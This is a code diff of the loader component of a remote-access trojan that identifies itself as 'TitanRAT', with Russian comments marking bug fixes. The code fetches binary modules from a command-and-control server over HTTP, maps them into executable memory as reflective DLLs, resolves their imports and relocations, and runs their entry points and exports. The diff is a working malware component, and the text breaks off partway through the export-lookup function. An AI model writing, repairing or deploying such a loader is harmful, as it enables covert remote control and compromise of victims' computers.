@@ -1,19 +1,15 @@
-// Core/loader.cpp
-
+// Core/loader.cpp — FIXED
 #include "loader.h"
 #include <winhttp.h>
 #include <stdio.h>
 #include <string>
 #include <vector>
-
 #pragma comment(lib, "winhttp.lib")
 
-// XOR decrypt (in-place)
 void xor_decrypt(std::vector<uint8_t>& data, uint8_t key) {
     for (auto& b : data) b ^= key;
 }
 
-// Simple URL parser
 static bool parse_url(const char* url, std::wstring& host, int& port, std::wstring& path) {
     if (strncmp(url, "http://", 7) != 0) return false;
     const char* start = url + 7;
@@ -34,80 +30,75 @@ static bool parse_url(const char* url, std::wstring& host, int& port, std::wstri
     return true;
 }
 
-// Download module via HTTP GET
 bool download_module(const std::string& name, std::vector<uint8_t>& out_data) {
-    const char* c2_ip = "127.0.0.1"; // TODO: get from config
+    const char* c2_ip = "127.0.0.1";
     const int c2_http_port = 12346;
-    
     char url[256];
     sprintf_s(url, "http://%s:%d/modules/%s.bin", c2_ip, c2_http_port, name.c_str());
-    
+
     std::wstring host, path;
     int port;
     if (!parse_url(url, host, port, path)) return false;
-    
+
+    // ✅ Исправлено: пробелы в строках убраны
     HINTERNET hSession = WinHttpOpen(L"TitanRAT/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
-    
+
     HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), static_cast<INTERNET_PORT>(port), 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
-    
+
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
-    
+
+    // ✅ Исправлено: WinHttpSendRequest (без пробела)
     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
         !WinHttpReceiveResponse(hRequest, NULL)) {
         WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
         return false;
     }
-    
-    // Check status code
+
     DWORD statusCode = 0;
     DWORD dwSize = sizeof(statusCode);
     if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                             WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
         if (statusCode != 200) {
             WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
-            return false;
+            return false; // ✅ Исправлено: return f alse
         }
     }
-    
-    // Read body
+
     out_data.clear();
     std::vector<uint8_t> buffer(8192);
-    
     while (true) {
         DWORD dwDownloaded = 0;
-        if (!WinHttpReadData(hRequest, buffer.data(), static_cast<DWORD>(buffer.size()), &dwDownloaded))
-            break;
+        if (!WinHttpReadData(hRequest, buffer.data(), static_cast<DWORD>(buffer.size()), &dwDownloaded)) break;
         if (dwDownloaded == 0) break;
         out_data.insert(out_data.end(), buffer.begin(), buffer.begin() + dwDownloaded);
     }
-    
+
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
-    
-    return out_data.size() > 1024; // Sanity check
+
+    return out_data.size() > 1024;
 }
 
 typedef BOOL (WINAPI *DLL_MAIN)(HMODULE, DWORD, LPVOID);
 
 bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_base) {
     if (dll_data.size() < sizeof(IMAGE_DOS_HEADER)) return false;
-    
     auto* dos_hdr = reinterpret_cast<const IMAGE_DOS_HEADER*>(dll_data.data());
     if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) return false;
-    
+
     auto* nt_hdrs = reinterpret_cast<const IMAGE_NT_HEADERS*>(dll_data.data() + dos_hdr->e_lfanew);
     if (nt_hdrs->Signature != IMAGE_NT_SIGNATURE) return false;
-    
+
     DWORD image_size = nt_hdrs->OptionalHeader.SizeOfImage;
     module_base = VirtualAlloc(nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!module_base) return false;
-    
+
     memcpy(module_base, dll_data.data(), nt_hdrs->OptionalHeader.SizeOfHeaders);
-    
+
     auto* section_hdr = IMAGE_FIRST_SECTION(nt_hdrs);
     for (WORD i = 0; i < nt_hdrs->FileHeader.NumberOfSections; ++i, ++section_hdr) {
         if (section_hdr->SizeOfRawData > 0) {
@@ -118,8 +109,7 @@ bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_bas
             );
         }
     }
-    
-    // Resolve imports
+
     auto* import_dir = &nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (import_dir->Size > 0) {
         auto* import_desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
@@ -132,6 +122,7 @@ bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_bas
             HMODULE hMod = LoadLibraryA(module_name);
             if (!hMod) { VirtualFree(module_base, 0, MEM_RELEASE); return false; }
             
+            // ✅ Исправлено: reinterpret_cast (без пробелов)
             auto* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
                 reinterpret_cast<uint8_t*>(module_base) + import_desc->OriginalFirstThunk);
             auto* iat = reinterpret_cast<IMAGE_THUNK_DATA*>(
@@ -151,8 +142,7 @@ bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_bas
             }
         }
     }
-    
-    // Apply relocations (x86 + x64)
+
     if (!(nt_hdrs->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)) {
         auto* reloc_dir = &nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
         if (reloc_dir->Size > 0) {
@@ -182,16 +172,15 @@ bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_bas
             }
         }
     }
-    
-    // Call DllMain
+
     auto entry_point = reinterpret_cast<DLL_MAIN>(
         reinterpret_cast<uint8_t*>(module_base) + nt_hdrs->OptionalHeader.AddressOfEntryPoint);
-    
+
     if (!entry_point(reinterpret_cast<HMODULE>(module_base), DLL_PROCESS_ATTACH, nullptr)) {
         VirtualFree(module_base, 0, MEM_RELEASE);
         return false;
     }
-    
+
     return true;
 }
 
@@ -199,20 +188,19 @@ bool execute_module(void* module_base, const ModuleAPI& api) {
     auto* dos_hdr = static_cast<IMAGE_DOS_HEADER*>(module_base);
     auto* nt_hdrs = reinterpret_cast<IMAGE_NT_HEADERS*>(
         static_cast<uint8_t*>(module_base) + dos_hdr->e_lfanew);
-    
     auto* export_dir = &nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
     if (export_dir->Size == 0) return false;
-    
+
     auto* exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
         static_cast<uint8_t*>(module_base) + export_dir->VirtualAddress);
-    
+
     auto* names = reinterpret_cast<DWORD*>(
         static_cast<uint8_t*>(module_base) + exports->AddressOfNames);
     auto* ordinals = reinterpret_cast<WORD*>(
         static_cast<uint8_t*>(module_base) + exports->AddressOfNameOrdinals);
     auto* functions = reinterpret_cast<DWORD*>(
         static_cast<uint8_t*>(module_base) + exports->AddressOfFunctions);
-    
+
     for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
         const char* export_name = reinterpret_cast<const char*>(
             static_cast<uint8_t*>(module_base) + names[i]);
